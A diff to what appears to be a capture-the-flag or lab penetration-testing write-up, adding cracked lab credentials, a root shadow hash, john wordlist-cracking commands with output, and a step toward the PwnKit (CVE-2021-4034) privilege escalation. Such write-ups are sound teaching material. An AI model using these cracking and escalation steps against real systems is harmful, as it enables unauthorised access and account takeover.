@@ -435,6 +435,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 16:40:
 ```
 
 - From this we see we have 2 main users 
+	- jennifer: 123456
+	- root: dragon
+- We can now login as either root or jennifer 
 
 
 ## Local Enumeration 
@@ -465,7 +468,7 @@ Created directory: /home/kali/.john
 root:$5$BN8CmDdqe6QVOQkm$tuYdx49auWDZW3JZzsN9GKgriNTSAlSc/Js723Zvvv8:0:0:root:/root:/bin/bash
 ```
 
-- Run john to crack the password
+- Run john to crack root the password 
 ```
 ┌──(kali㉿kali-99-590)-[~/exploits]
 └─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt
@@ -480,7 +483,28 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-- And this shows roots password is **dragon**
+- We can now login as root
+
+### Method 2 - PwnKit (CVE-2021-4034)
+
+- Run john to crack jennifers password
+- We need to login as jennifer as www-data cant compile a binary
+```
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt jenunshadow.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (jennifer)
+1g 0:00:00:00 DONE (2023-03-06 16:38) 10.00g/s 2220p/s 2220c/s 2220C/s Spring2017..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+- And this shows jennifer's password is **123456**
+
+- Once we have logged in as jennifer we can download the polkit exploit
 
 
 
